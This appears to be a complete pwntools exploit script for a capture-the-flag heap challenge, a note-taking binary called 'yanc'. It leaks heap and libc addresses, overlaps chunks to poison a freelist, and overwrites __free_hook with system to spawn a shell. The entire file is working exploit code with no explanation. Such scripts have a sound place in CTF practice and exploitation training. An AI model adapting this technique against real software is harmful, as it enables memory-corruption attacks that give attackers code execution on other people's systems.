#!/usr/bin/env python
import pwn
import re
import ctypes

p = pwn.process(['./yanc'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

latoheap = -0x290
latolibc = -0x1c0cc0
latosystem = -0x17b0e0
systofreehook = 0x17cd28

def add_note(note, title, sen1 = 0, sen2 = 0):
    p.recvuntil("quit")
    p.sendline("1")
    p.recvuntil("note :")
    if sen1 == 0:
        p.sendline(note)
    else:
        p.send(note)
    p.recvuntil("title :")
    if sen2 == 0:
        p.sendline(title)
    else:
        p.send(title)
    return

def del_note(index):
    p.recvuntil("quit")
    p.sendline("2")
    p.recvuntil("one :")
    p.sendline(str(index))
    return

def view_notes():
    p.recvuntil("quit")
    p.sendline("3")
    r = p.recvuntil("1. add")
    return r

def quit():
    p.recvuntil("quit")
    p.sendline("4")
    return

add_note("A"*0x20, "B"*0x20)
add_note("A"*0x20, "B"*0x20)
r = view_notes()
r = re.search("Title :.*", r).group(0)[40:]
la = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
print "[+] Address on heap: "+hex(la)
heap = la + latoheap
print "[+] Heap starts at: "+hex(heap)
del_note(0)
del_note(1)
for i in range(10):
    add_note("A"*0xF0,"BB")
for i in range(7):
    del_note(i)
del_note(8)
del_note(7)
add_note("A"*0x100,"FF")
p.recvuntil("Nope")
r = view_notes()
r = re.search("Note :.*", r).group(0)[(0x100+7):]
la = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
print "[+] Main arena at: "+hex(la)
libc = la + latolibc
sys = la + latosystem
print "[+] libc starts at: "+hex(libc)
print "[+] System is at: "+hex(sys)
freehook = sys + systofreehook
print "[+] Free hook is at: "+hex(freehook)
add_note("G"*0xe0,"XY")

del_note(0)
del_note(1)
del_note(9)

add_note("G"*64,"A")
del_note(0)
sen1 = "G"*0x28
sen1 += pwn.p64(0x41)
sen1 += pwn.p64(0)*7
sen1 += pwn.p64(0x71)
sen1 += "G"*0x60

add_note(sen1,"A")
add_note("H"*0x10,"B")
del_note(0)
add_note(sen1,"A"*0x20+"\x40")
del_note(1)

fake = heap + 0x10

sen2 = "G"*0x28
sen2 += pwn.p64(0x41)
sen2 += pwn.p64(freehook)
sen2 += pwn.p64(fake)
sen2 += pwn.p64(0)*5
sen2 += pwn.p64(0x71)
sen2 += "G"*0x60

del_note(0)
add_note(sen2, "B")
string = "/bin/sh".ljust(0x30,"\x00")
add_note(string, "X")
sen3 = pwn.p64(sys).ljust(0x30,"\x00")
add_note(sen3, "Y")
del_note(1)



p.interactive()
